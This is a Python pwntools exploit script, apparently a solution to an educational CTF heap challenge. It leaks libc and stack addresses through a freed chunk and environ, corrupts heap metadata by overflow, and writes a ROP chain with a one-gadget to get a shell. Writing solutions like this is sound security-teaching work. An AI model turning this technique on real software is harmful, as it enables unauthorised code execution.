from pwn import *
## FLAG{C8763}
def add(idx, name):
    r.sendafter(b'> ',b'1')
    r.sendlineafter(b'> ',str(idx))
    r.sendafter(b'> ',name)


def edit(idx, size, data):
    r.sendafter(b'> ',b'2')
    r.sendlineafter(b'> ',str(idx))
    r.sendlineafter(b'> ',str(size))
    r.send(data)

def delete(idx):
    r.sendafter(b'> ',b'3')
    r.sendlineafter(b'> ',str(idx))

def show():
    r.sendafter(b'> ',b'4')

r = process('./share/chal')
#r = remote('edu-ctf.zoolab.org',10007)
add(1,b'ccccc')
edit(1,0x410,b'123')
add(2,b'ccccc')
delete(2)
delete(1)
show()

r.recvuntil(b'data: ')
libc_base = u64(r.recv(6) + b'\x00\x00') - 0x1ecbe0
print(hex(libc_base))

### leak stack addr
environ = libc_base + 0x1ef600

add(3,b'ccccc')

edit(3,0x20,b'0') 
add(4,b'ccccc')
add(5,b'ccccc')
payload = p64(0) * 5
payload += p64(0x20)
payload += p64(0x63) + p64(0)
payload += p64(environ)

edit(3,0x400,payload)
show()
r.recvuntil(b'[5]')
r.recvuntil(b'data: ')
stack = u64(r.recv(6) + b'\x00'*2) - 0x100 - 0x20
print(hex(stack))

# ### heap overflow to rop at main return address
pop_r12_ret = libc_base + 0x2f709
pop_r15_ret = libc_base + 0x23b69
onegadget = libc_base + 0xe3afe 

payload = p64(0) * 3
payload += p64(0x31)
payload += p64(0x63) + p64(0)
payload += p64(0x63) + p64(0)
payload += p64(stack)
edit(3,0x400,payload)

rop = p64(pop_r12_ret) + p64(0)
rop += p64(pop_r15_ret) + p64(0)
rop += p64(onegadget)

edit(5,0x400, rop)


r.interactive()
